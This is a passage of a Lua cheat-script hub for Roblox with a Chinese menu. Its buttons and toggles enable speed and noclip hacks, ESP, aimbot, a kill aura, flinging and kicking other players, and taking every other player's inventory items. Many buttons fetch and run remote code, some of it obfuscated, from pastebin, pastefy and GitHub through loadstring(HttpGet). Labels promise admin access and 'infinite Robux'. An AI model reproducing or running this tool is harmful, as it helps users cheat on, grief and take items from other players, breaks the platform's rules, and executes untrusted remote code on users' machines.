        FieldOfView = 70,
        Connection = nil
    }
    
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local LocalPlayer = Players.LocalPlayer
    
    local function applyCameraSettings()
        if not LocalPlayer then return end
        
        if _G.Camera.ZoomEnabled then
            LocalPlayer.CameraMaxZoomDistance = _G.Camera.ZoomDistance
        end
        
        if _G.Camera.FOVEnabled and Workspace.CurrentCamera then
            Workspace.CurrentCamera.FieldOfView = _G.Camera.FieldOfView
        end
    end
    
    local function resetCameraSettings()
        if LocalPlayer then
            LocalPlayer.CameraMaxZoomDistance = 128
        end
        
        if Workspace.CurrentCamera then
            Workspace.CurrentCamera.FieldOfView = 70
        end
    end
    
    local function startLoop()
        if _G.Camera.Connection then
            _G.Camera.Connection:Disconnect()
        end
        
        _G.Camera.Connection = RunService.Heartbeat:Connect(function()
            applyCameraSettings()
        end)
    end
    
    local function stopLoop()
        if _G.Camera.Connection then
            _G.Camera.Connection:Disconnect()
            _G.Camera.Connection = nil
        end
        resetCameraSettings()
    end
    
    Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
        if _G.Camera.FOVEnabled and Workspace.CurrentCamera then
            Workspace.CurrentCamera.FieldOfView = _G.Camera.FieldOfView
        end
    end)
    
    _G.CameraFunctions = {
        apply = applyCameraSettings,
        reset = resetCameraSettings,
        start = startLoop,
        stop = stopLoop
    }
end)

run(function()
    about:Toggle("开启/关闭缩放距离", "Zoom Enabled", false, function(Value)
        _G.Camera.ZoomEnabled = Value
        if _G.Camera.ZoomEnabled or _G.Camera.FOVEnabled then
            _G.CameraFunctions.start()
        else
            _G.CameraFunctions.stop()
        end
    end)
    
    about:Slider("设置缩放距离", "Zoom Distance", 128, 128, 200000, false, function(Value)
        _G.Camera.ZoomDistance = Value
        if _G.Camera.ZoomEnabled then
            game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = Value
        end
    end)
    
    about:Toggle("开启/关闭焦距", "FOV Enabled", false, function(Value)
        _G.Camera.FOVEnabled = Value
        if _G.Camera.ZoomEnabled or _G.Camera.FOVEnabled then
            _G.CameraFunctions.start()
        else
            _G.CameraFunctions.stop()
        end
    end)
    
    about:Slider("设置焦距", "Field of View", 70, 0.1, 250, false, function(Value)
        _G.Camera.FieldOfView = Value
        if _G.Camera.FOVEnabled and game.Workspace.CurrentCamera then
            game.Workspace.CurrentCamera.FieldOfView = Value
        end
    end)
end)

local about = PIJIAOBEN:section("快速跑步", false)

about:Textbox("设置快速跑步", "run", "输入", function(v)
            Speed = v
end)

about:Toggle("开启/关闭快速跑步","switch",false,function(v)
            if v == true then
                sudu = game:GetService("RunService").Heartbeat:Connect(function()
                    if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character.Humanoid and game:GetService("Players").LocalPlayer.Character.Humanoid.Parent then
                        if game:GetService("Players").LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                            game:GetService("Players").LocalPlayer.Character:TranslateBy(game:GetService("Players").LocalPlayer.Character.Humanoid.MoveDirection * Speed / 0.5)
                        end
                    end
                end)
            elseif not v and sudu then
                sudu:Disconnect()
                sudu = nil
            end
end)

local PIJIAOBEN = XIAOPI:Tab("通用","136169594232359")

local about = PIJIAOBEN:section("通用", false)

about:Button("隐身道具", function()
  loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)",true))()
end)

about:Toggle("循环恢复血量", "HF", false, function(HF)
    if HF then while true do game.Players.LocalPlayer.Character.Humanoid.Health = 9e9 wait() end end
end)

about:Button("锁定视野", function()
loadstring(game:HttpGet("https://pastefy.app/nekmtvpA/raw"))()
end)

about:Toggle('解锁最大视野', "Cam", false, function(Value)
    Cam1 = Value
        if Cam1 then
            Cam2()
        end
    end    
)
Cam2 = function()
    while Cam1 do
    wait(0.1)
    game:GetService('Players').LocalPlayer.CameraMaxZoomDistance = 9e9
    end
    while not Cam1 do
    wait(0.1)
    game:GetService('Players').LocalPlayer.CameraMaxZoomDistance = 32
    end
end

about:Button(
    "查看游戏中的所有玩家（包括血量条）",
    function()
loadstring(game:HttpGet(('https://pastebin.com/raw/G2zb992X'),true))()
    end)

about:Button("工具包",function()
        loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
end)

about:Button("老外传送至玩家身边",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Teleport%20Gui.lua'))()
end)
  
about:Button("点击传送道具", function()
loadstring(game:HttpGet("https://pastefy.app/Jf2QXOwa/raw"))()
end)

about:Toggle("穿墙", "NoClip", false, function(NC)
  local Workspace = game:GetService("Workspace") local Players = game:GetService("Players") if NC then Clipon = true else Clipon = false end Stepped = game:GetService("RunService").Stepped:Connect(function() if not Clipon == false then for a, b in pairs(Workspace:GetChildren()) do if b.Name == Players.LocalPlayer.Name then for i, v in pairs(Workspace[Players.LocalPlayer.Name]:GetChildren()) do if v:IsA("BasePart") then v.CanCollide = false end end end end else Stepped:Disconnect() end end)
end)

about:Button("星飞行",function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/zilinskaslandon/XingJiaoBen-2026-/refs/heads/main/%E6%98%9F%E9%A3%9E%E8%A1%8C.Lua"))()
end)

about:Button("皮飞车",function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/Pi-feiche.lua"))()
end)

about:Button("皮自瞄",function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/3683e49998644fb7.txt_2024-08-09_094310.OTed.lua"))()
end)

about:Button("皮甩飞", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/%E7%9A%AE%E7%94%A9%E9%A3%9E.lua"))()
end)

about:Button("甩飞所有人",function()
          loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
end)

about:Button("死亡笔记",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/1_1.txt_2024-08-08_153358.OTed.lua"))()
end)

about:Button("铁拳",function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'))()
end)

about:Button("电脑键盘",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)

about:Toggle("防甩飞", "Anti ragdoll", false, function(state)
    local player = game.Players.LocalPlayer
    local runService = game:GetService("RunService")
    
    if state then
       
        _G.AntiRagdoll = runService.Stepped:Connect(function()
            for _, otherPlayer in pairs(game.Players:GetPlayers()) do
                if otherPlayer ~= player and otherPlayer.Character then
                    local char = otherPlayer.Character
                   
                    for _, v in pairs(char:GetDescendants()) do
                        if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                            v.CanCollide = false
                            
                            v.Massless = true
                        end
                    end
                   
                    local rootPart = char:FindFirstChild("HumanoidRootPart")
                    if rootPart then
                        rootPart.Massless = true
                    end
                end
            end
        end)
    else
        if _G.AntiRagdoll then
            _G.AntiRagdoll:Disconnect()
            _G.AntiRagdoll = nil
        end
        
        for _, otherPlayer in pairs(game.Players:GetPlayers()) do
            if otherPlayer ~= player and otherPlayer.Character then
                local char = otherPlayer.Character
                for _, v in pairs(char:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = true
                        v.Massless = false
                    end
                end
            end
        end
    end
end)
about:Toggle("无法移动", "Fake flag", false, function(state)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()

        if state then
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Anchored = true
                end
            end
        else
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Anchored = false
                end
            end
        end
end)

about:Button("自杀",function()
game.Players.LocalPlayer.Character.Humanoid.Health=0
end)

about:Button("踏空行走",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
end)

about:Button("通用ESP",function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
end)

about:Button("踢人脚本(仅娱乐)",function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/c8320f69b6aa4f5d.txt_2024-08-08_214628.OTed.lua"))()
end)

about:Button("动画中心",function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
end)

about:Button("爬墙",function()
  loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

about:Button("替身",function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/SkrillexMe/SkrillexLoader/main/SkrillexLoadMain')))()
end)
    
about:Button("碰到就飞",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
end)

about:Button("操人脚本", function()
loadstring(game:HttpGet("https://pastefy.app/BkeffrT5/raw"))()
end)

about:Button("圈圈自瞄(可调)", function()
loadstring(game:HttpGet("https://pastefy.app/YnfF3sje/raw"))()
end)

about:Button("iw指令", function()
  loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

about:Toggle("人物不可见状态(隐身)", "Invisible Character", false, function(state)
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()

    for _, part in pairs(character:GetChildren()) do
        if part:IsA("BasePart") then
            part.Transparency = state and 1 or 0
            part.CanCollide = not state
        elseif part:IsA("Accessory") then
            part.Handle.Transparency = state and 1 or 0
        end
    end
end)

local getBackpackRunning = false

about:Toggle("获取所有玩家背包道具", "GetBackPack", false, function(state)
    getBackpackRunning = state
    
    if state then
        task.spawn(function()
            while getBackpackRunning do
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if not getBackpackRunning then break end
                    
                    if player ~= game.Players.LocalPlayer then
                        for _, item in ipairs(player.Backpack:GetChildren()) do
                            if not getBackpackRunning then break end
                            
                            pcall(function()
                                item.Parent = game.Players.LocalPlayer.Backpack
                            end)
                            task.wait()
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
end)

about:Button("获取所有玩家道具",function()
for i,v in pairs (game.Players:GetChildren()) do
wait()
for i,b in pairs (v.Backpack:GetChildren()) do
b.Parent = game.Players.LocalPlayer.Backpack
end
end
end)

about:Button("获取当前道具",function()
loadstring(game:HttpGet("https://pastefy.app/3FU05Dyt/raw"))()
end)

about:Button("装备全部道具",function()
loadstring(game:HttpGet("https://pastefy.app/uBqVR9JC/raw"))()
end)

about:Button("删除道具",function()
loadstring(game:HttpGet("https://pastefy.app/r4LHK4p0/raw"))()
end)

about:Button("删除所有道具",function()
loadstring(game:HttpGet("https://pastefy.app/8HB71Lbj/raw"))()
end)

local maxDistance = 10

about:Textbox("互动距离", "", "输入(默认10米)", function(text)
    local distance = tonumber(text)
    if distance and distance > 0 then
        maxDistance = distance
    else
        warn("请输入有效的距离数值")
    end
end)

about:Toggle("自动互动","AutoInteract",false,function(state)
    if state then
        autoInteract = true
        while autoInteract do
            local player = game.Players.LocalPlayer
            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                local playerPosition = character.HumanoidRootPart.Position
                
                for _,descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("ProximityPrompt") then
                        local objectPosition = descendant.Parent and descendant.Parent:IsA("BasePart") and descendant.Parent.Position
                        if objectPosition then
                            local distance = (playerPosition - objectPosition).Magnitude
                            if distance <= maxDistance then
                                fireproximityprompt(descendant)
                            end
                        else
                            fireproximityprompt(descendant)
                        end
                    end
                end
            end
            task.wait(0.25)
        end
    else
        autoInteract = false
    end
end)

local customHoldDuration = 0

about:Textbox("互动时间", "", "输入(默认0秒)", function(text)
    local duration = tonumber(text)
    if duration and duration >= 0 then
        customHoldDuration = duration
    else
        warn("请输入有效的时间数值")
    end
end)

about:Toggle("快速互动", "InstantProximityPrompt", false, function(Value)
    local promptConnection = nil
    
    if Value then
        promptConnection = game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(v)
            v.HoldDuration = customHoldDuration
        end)
    else
        if promptConnection then
            promptConnection:Disconnect()
            promptConnection = nil
        end
    end
end)

local xrayOn = false

local function toggleXRay()
    xrayOn = not xrayOn
    for i, descendant in pairs(workspace:GetDescendants()) do
        if descendant:IsA("BasePart") then
            if xrayOn then
                if not descendant:FindFirstChild("OriginalTransparency") then
                    local originalTransparency = Instance.new("NumberValue")
                    originalTransparency.Name = "OriginalTransparency"
                    originalTransparency.Value = descendant.Transparency
                    originalTransparency.Parent = descendant
                end
                descendant.Transparency = 0.5
            else
                if descendant:FindFirstChild("OriginalTransparency") then
                    descendant.Transparency = descendant.OriginalTransparency.Value
                end
            end
        end
    end
end


about:Toggle("X-Ray", "text", false, function(Value)
    if Value then
        toggleXRay()
    else
        toggleXRay()
    end
end)

about:Toggle("无限跳", "IJ", false, function(IJ)
    getgenv().InfJ = IJ game:GetService("UserInputService").JumpRequest:connect(function() if InfJ == true then game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping") end end)
end)

about:Toggle('上帝模式', 'No Description', false, function(Value)
    if Value then
        local LP = game:GetService("Players").LocalPlayer
        local HRP = LP.Character and LP.Character.HumanoidRootPart
        local Clone = HRP:Clone()
        Clone.Parent = LP.Character
    else
        game.Players.LocalPlayer.Character.Head:Destroy()
    end
end)

about:Button("聊天气泡美化",function()
loadstring(game:HttpGet("https://pastefy.app/lCEPuiQO/raw"))()
end)

about:Toggle("靠近敌人自动攻击[需要先装备武器]", "Toggle", false, function(state)
    if state then
        local connections = getgenv().configs and getgenv().configs.connections
        if connections then
            local Disable = getgenv().configs.Disable
            for _, v in pairs(connections) do
                v:Disconnect()
            end
            Disable:Fire()
            Disable:Destroy()
            table.clear(getgenv().configs)
        end

        local Disable = Instance.new("BindableEvent")
        getgenv().configs = {
            connections = {},
            Disable = Disable,
            Size = Vector3.new(10, 10, 10),
            DeathCheck = true
        }

        local Players = game:GetService("Players")
        local RunService = game:GetService("RunService")
        local lp = Players.LocalPlayer
        local Run = true
        local Ignorelist = OverlapParams.new()
        Ignorelist.FilterType = Enum.RaycastFilterType.Include

        local function getchar(plr)
            plr = plr or lp
            return plr.Character
        end

        local function gethumanoid(plr)
            local char = plr:IsA("Model") and plr or getchar(plr)
            if char then
                return char:FindFirstChildWhichIsA("Humanoid")
            end
        end

        local function IsAlive(Humanoid)
            return Humanoid and Humanoid.Health > 0
        end

        local function GetTouchInterest(Tool)
            return Tool and Tool:FindFirstChildWhichIsA("TouchTransmitter", true)
        end

        local function GetCharacters(LocalPlayerChar)
            local Characters = {}
            for _, v in pairs(Players:GetPlayers()) do
                table.insert(Characters, getchar(v))
            end
            for i, char in pairs(Characters) do
                if char == LocalPlayerChar then
                    table.remove(Characters, i)
                    break
                end
            end
            return Characters
        end

        local function Attack(Tool, TouchPart, ToTouch)
            if Tool:IsDescendantOf(workspace) then
                Tool:Activate()
                firetouchinterest(TouchPart, ToTouch, 1)
                firetouchinterest(TouchPart, ToTouch, 0)
            end
        end

        table.insert(getgenv().configs.connections, Disable.Event:Connect(function()
            Run = false
        end))

        while Run do
            local char = getchar()
            if IsAlive(gethumanoid(char)) then
                local Tool = char and char:FindFirstChildWhichIsA("Tool")
                local TouchInterest = Tool and GetTouchInterest(Tool)

                if TouchInterest then
                    local TouchPart = TouchInterest.Parent
                    local Characters = GetCharacters(char)
                    Ignorelist.FilterDescendantsInstances = Characters
                    local InstancesInBox = workspace:GetPartBoundsInBox(TouchPart.CFrame, TouchPart.Size + getgenv().configs.Size, Ignorelist)

                    for _, v in pairs(InstancesInBox) do
                        local Character = v:FindFirstAncestorWhichIsA("Model")
                        if table.find(Characters, Character) then
                            if getgenv().configs.DeathCheck and IsAlive(gethumanoid(Character)) then
                                Attack(Tool, TouchPart, v)
                            elseif not getgenv().configs.DeathCheck then
                                Attack(Tool, TouchPart, v)
                            end
                        end
                    end
                end
            end
            RunService.Heartbeat:Wait()
        end
    else
        local Disable = getgenv().configs.Disable
        if Disable then
            Disable:Fire()
            Disable:Destroy()
        end

        for _, connection in pairs(getgenv().configs.connections) do
            connection:Disconnect()
        end
        table.clear(getgenv().configs.connections)
        Run = false
    end
end)
    			
about:Toggle("坐下", "Sound", false, function(Value)
		if Value then
		    game.Players.LocalPlayer.Character.Humanoid.Sit = true
		else
		game.Players.LocalPlayer.Character.Humanoid.Sit = false		    
      end
end)

about:Toggle("声音折磨", "Sound", false, function(bool)
    getgenv().spamSoond = bool
        if bool then
            spamSound()
        end
end)

function spamSound()
	while getgenv().spamSoond == true do
		local class_check = game.IsA
		local sound = Instance.new('Sound')
		local sound_stop = sound.Play
		local get_descendants = game.GetDescendants

		for i,v in next, get_descendants(game) do 
			if class_check(v,"Sound") then
				sound_stop(v)
			end
		end

		get_descendants = nil
		sound:Remove()
		get_descendants = nil
		sound_stop = nil
        task.wait()
	end
end
about:Toggle("七彩建筑", "BasePart", false, function(Value)
		if Value then
		Break = false
		local BaseParts = {}
local Mats = Enum.Material:GetEnumItems()

for i,v in pairs(game.Workspace:GetDescendants()) do
    if v:IsA("BasePart") then
        table.insert(BaseParts, v)
    end
end

game.Workspace.DescendantAdded:Connect(function(v)
    if v:IsA("BasePart") then
        table.insert(BaseParts, v)
    end
end)

while task.wait(0.025) do
    for i,v in pairs(BaseParts) do
        v.Material = Mats[math.random(1, #Mats)]
        v.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    if Break then break end
    end
end
		else
		Break = true
		end
end)

local player = game.Players.LocalPlayer
local enabled = false
local deathPos = nil
local waitTime = 0

about:Textbox("等待时间(秒)", "", "输入(默认0秒)", function(time)
    waitTime = tonumber(time) or 0
end)

about:Toggle("原地复活", "", false, function(state)
    enabled = state
end)

player.CharacterAdded:Connect(function(char)
    if enabled and deathPos then
        wait(waitTime)
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.CFrame = CFrame.new(deathPos)
        end
    end
end)

player.CharacterAdded:Connect(function(char)
    local humanoid = char:WaitForChild("Humanoid")
    humanoid.Died:Connect(function()
        if enabled then
            deathPos = char.HumanoidRootPart.Position
        end
    end)
end)

about:Button("人物螺旋上天",function()
loadstring(game:HttpGet("https://pastefy.app/xV1T3PAi/raw"))()
end)

about:Button("无限R币", function()
    loadstring(game:HttpGet("https://pastefy.app/SxhPVOyM/raw"))()
end)

local originalChatVisible = nil  

about:Toggle("显示聊天框", "", false, function(state)
    chatEnabled = state 
    
    if state then
        if originalChatVisible == nil then
            originalChatVisible = game:GetService("StarterGui"):GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
        end        
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
        
        if heartbeatConnection then heartbeatConnection:Disconnect() end
        heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
        end)
    else
        if heartbeatConnection then
            heartbeatConnection:Disconnect()
            heartbeatConnection = nil
        end
        
        if originalChatVisible ~= nil then
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, originalChatVisible)
        else
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        end
    end
end)

about:Button("获得管理员权限",function()
loadstring(game:HttpGet("https://pastebin.com/raw/sZpgTVas"))()
end)

about:Button("显示时间", function()
loadstring(game:HttpGet("https://pastebin.com/raw/RycMWV3a"))()
end)

about:Button("F3X", function()
  loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end)

local NotificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMinisterq/Notification-Library/Main/Library.lua"))()

local notifyEnabled = false
local playerAddedConn = nil
local playerRemovedConn = nil

about:Toggle("玩家进出服务器通知", "", false, function(state)
    notifyEnabled = state
    
    if playerAddedConn then playerAddedConn:Disconnect() end
    if playerRemovedConn then playerRemovedConn:Disconnect() end
    
    if state then
        playerAddedConn = game.Players.ChildAdded:Connect(function(player)
            pcall(function()
                if notifyEnabled then
                    NotificationLibrary:SendNotification("Success", player.Name.." 加入了游戏", 5)
                end
            end)
        end)
        
        playerRemovedConn = game.Players.ChildRemoved:Connect(function(player)
            pcall(function()
                if notifyEnabled then
                    NotificationLibrary:SendNotification("Error", player.Name.." 离开了游戏", 5)
                end
            end)
        end)
    end
end)

local about = PIJIAOBEN:section("游戏设置", false)

about:Button("重新加入游戏", function()
    loadstring(game:HttpGet("https://pastefy.app/XXabqNiv/raw"))()  
end)
about:Button("保存游戏", function()
  saveinstance()
end)
about:Button("离开游戏", function()
  game:Shutdown()
end)

local about = PIJIAOBEN:section("修改时间", false)

local lighting = game:GetService("Lighting")
local selectedTimeValue = "12:00:00"

about:Dropdown("选择时间", "", {
    "午夜 00:00",
    "凌晨 03:00",
    "清晨 06:00", 
    "上午 09:00",
    "中午 12:00",
    "下午 15:00",
    "傍晚 18:00",
    "夜晚 21:00"
}, function(selectedTime)
    if selectedTime == "午夜 00:00" then
        selectedTimeValue = "00:00:00"
    elseif selectedTime == "凌晨 03:00" then
        selectedTimeValue = "03:00:00"
    elseif selectedTime == "清晨 06:00" then
        selectedTimeValue = "06:00:00"
    elseif selectedTime == "上午 09:00" then
        selectedTimeValue = "09:00:00"
    elseif selectedTime == "中午 12:00" then
        selectedTimeValue = "12:00:00"
    elseif selectedTime == "下午 15:00" then
        selectedTimeValue = "15:00:00"
    elseif selectedTime == "傍晚 18:00" then
        selectedTimeValue = "18:00:00"
    elseif selectedTime == "夜晚 21:00" then
        selectedTimeValue = "21:00:00"
    end
end)

about:Button("确认修改时间", function()
    lighting.TimeOfDay = selectedTimeValue
end)

local about = PIJIAOBEN:section("设置相机", false)

local run = function(func) func() end

run(function()
    _G.CameraControlConfig = {
        enabled = false,
        disableAutoReset = false,
        originalSettings = nil,
        cameraTypeMap = {
            ["自定义"] = Enum.CameraType.Custom,
            ["附加"] = Enum.CameraType.Attach,
            ["固定"] = Enum.CameraType.Fixed,
            ["跟随"] = Enum.CameraType.Follow,
            ["动态观察"] = Enum.CameraType.Orbital,
            ["可脚本化"] = Enum.CameraType.Scriptable,
            ["跟踪"] = Enum.CameraType.Track,
            ["观看"] = Enum.CameraType.Watch
        },
        cameraModeMap = {
            ["经典"] = Enum.CameraMode.Classic,
            ["第一人称"] = Enum.CameraMode.LockFirstPerson
        }
    }
end)

run(function()
    _G.CameraControlServices = {
        Players = game:GetService("Players"),
        Workspace = game:GetService("Workspace"),
        LocalPlayer = game:GetService("Players").LocalPlayer,
        Camera = game:GetService("Workspace").CurrentCamera
    }
end)

run(function()
    local Camera = _G.CameraControlServices.Camera
    local LocalPlayer = _G.CameraControlServices.LocalPlayer
    local config = _G.CameraControlConfig
    
    if not config.originalSettings then
        config.originalSettings = {
            CameraType = Camera.CameraType,
            CameraMode = LocalPlayer.CameraMode,
            OcclusionMode = LocalPlayer.DevCameraOcclusionMode
        }
    end
    
    local function executeWithProtection(func)
        config.disableAutoReset = true
        local success, err = pcall(func)
        if not success then
            warn("相机设置失败: " .. tostring(err))
        end
        config.disableAutoReset = false
    end
    
    local function safeSet(func)
        if not config.enabled then return end
        executeWithProtection(func)
    end
    
    local function restoreOriginalSettings()
        executeWithProtection(function()
            Camera.CameraType = config.originalSettings.CameraType
            LocalPlayer.CameraMode = config.originalSettings.CameraMode
            LocalPlayer.DevCameraOcclusionMode = config.originalSettings.OcclusionMode
        end)
    end
    
    _G.CameraControlCore = {
        safeSet = safeSet,
        restore = restoreOriginalSettings,
        setEnabled = function(state)
            if state == config.enabled then return end
            config.enabled = state
            if not state then
                restoreOriginalSettings()
            end
        end,
        setCameraType = function(value)
            safeSet(function()
                if config.cameraTypeMap[value] then
                    Camera.CameraType = config.cameraTypeMap[value]
                end
            end)
        end,
        setCameraMode = function(value)
            safeSet(function()
                if config.cameraModeMap[value] then
                    LocalPlayer.CameraMode = config.cameraModeMap[value]
                end
            end)
        end,
        setOcclusionMode = function(state)
            safeSet(function()
                LocalPlayer.DevCameraOcclusionMode = state and Enum.DevCameraOcclusionMode.Invisicam or Enum.DevCameraOcclusionMode.Zoom
            end)
        end
    }
end)

run(function()
    local Camera = _G.CameraControlServices.Camera
    local LocalPlayer = _G.CameraControlServices.LocalPlayer
    local core = _G.CameraControlCore
    local config = _G.CameraControlConfig
    
    about:Toggle("开启/关闭相机控制", "CameraControlEnabled", false, function(State)
        core.setEnabled(State)
    end)
    
    about:Dropdown("相机类型", "CameraType", {"自定义", "附加", "固定", "跟随", "动态观察", "可脚本化", "跟踪", "观看"}, function(Value)
        core.setCameraType(Value)
    end)
    
    about:Toggle("开启遮挡模式", "DevCameraOcclusionMode", false, function(State)
        core.setOcclusionMode(State)
    end)
    
    about:Dropdown("相机模式", "CameraMode", {"经典", "第一人称"}, function(Value)
        core.setCameraMode(Value)
    end)
    
    Camera:GetPropertyChangedSignal("CameraType"):Connect(function()
        if not config.enabled or config.disableAutoReset then return end
        local func = function()
            Camera.CameraType = Enum.CameraType.Scriptable
        end
        config.disableAutoReset = true
        pcall(func)
        config.disableAutoReset = false
    end)
    
    LocalPlayer:GetPropertyChangedSignal("CameraMode"):Connect(function()
        if not config.enabled or config.disableAutoReset then return end
        local func = function()
            LocalPlayer.CameraMode = Enum.CameraMode.Classic
        end
        config.disableAutoReset = true
        pcall(func)
        config.disableAutoReset = false
    end)
    
    LocalPlayer:GetPropertyChangedSignal("DevCameraOcclusionMode"):Connect(function()
        if not config.enabled or config.disableAutoReset then return end
        local func = function()
            LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
        end
        config.disableAutoReset = true
        pcall(func)
        config.disableAutoReset = false
    end)
end)

local about = PIJIAOBEN:section("指令", false)

about:Button("指令脚本", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

about:Label("bang能够掀人")
about:Label("noface没有脸")
about:Label("headsit坐在玩家头上加玩家名字")
about:Label("float悬浮")
about:Label("re重置人物但位置不变")
about:Label("dance跳舞")
about:Label("nolegs没有腿")
about:Label("walltp碰到墙壁传送到墙壁顶部")
about:Label("bring+玩家名字可以让玩家吸到你手上但是只能用于一些服务器")
about:Label("carpet趴着走")
about:Label("infjump无限跳跃")
about:Label("xray透视地图所有物体变透明")
about:Label("bang玩家开头两个英文吸在玩家身后")
about:Label("noanim没有动作")
about:Label("spin人物旋转")
about:Label("sitwalk坐着走")
about:Label("trip让你的人物摔倒")
about:Label("antikick防踢")
about:Label("lay躺下")
about:Label("sit坐")
about:Label("god加血")
about:Label("invisfling配合加血可以旋转")
about:Label("goto+玩家名字传送")
about:Label("unxray关闭透视")
about:Label("noclip穿墙")

local about = PIJIAOBEN:section("念力", false)

about:Button("念力工具", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Mindpower.lua"))()
end)

about:Label("Q - 靠近")
about:Label("E - 离远")
about:Label("Y - 投掷")
about:Label("J - 超级投掷")
about:Label("U - 使物体自转")
about:Label("P - 使物体悬浮在空中")
about:Label("X - 走得更远一点")
about:Label("L - 使方块变直并锁定在前部")

about:Button("让手上的道具飘起来", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/WmD8MuSx"))()
end)

about:Label("J-飞起来")
about:Label("K-回到手中")

local about = PIJIAOBEN:section("子弹追踪", false)

local run = function(func) func() end

run(function()
    local Workspace = game:GetService("Workspace")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Camera = Workspace.CurrentCamera
    local RunService = game:GetService("RunService")
    
    local old
    local main = {
        enable = false,
        teamcheck = false,
        friendcheck = false,
        enablenpc = false,
        trackDistance = 500,
        aliveCheck = false,
        wallCheck = false
    }
    
    local playerCache = {}
    local npcCache = {}
    local lastCacheUpdate = 0
    local CACHE_UPDATE_INTERVAL = 0.1
    
    local function isVisible(targetHead)
        if not main.wallCheck then return true end
        
        if not LocalPlayer.Character then return false end
        local cameraPart = Camera or Workspace.CurrentCamera
        if not cameraPart then return false end
        
        local origin = cameraPart.CFrame.Position
        local target = targetHead.Position
        
        local raycastParams = RaycastParams.new()
        raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
        raycastParams.FilterDescendantsInstances = {
            LocalPlayer.Character,
            cameraPart,
            Workspace:FindFirstChild("Camera")
        }
        raycastParams.IgnoreWater = true
        
        local direction = (target - origin)
        local distance = direction.Magnitude
        local unitDirection = direction.Unit
        
        local result = Workspace:Raycast(origin, unitDirection * distance, raycastParams)
        
        if not result then
            return true
        end
        
        local hitInstance = result.Instance
        if hitInstance then
            local targetCharacter = targetHead.Parent
            if targetCharacter then
                if hitInstance:IsDescendantOf(targetCharacter) then
                    return true
                end
                
                if hitInstance:IsA("Terrain") or (hitInstance:IsA("Part") and hitInstance.Material == Enum.Material.Water) then
                    return true
                end
            end
        end
        
        return false
    end
    
    local function isAlive(character)
        if not character then return false end
        if not main.aliveCheck then return true end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return false end
        
        if humanoid.Health <= 0 then return false end
        
        if humanoid:GetState() == Enum.HumanoidStateType.Dead then return false end
        
        local head = character:FindFirstChild("Head")
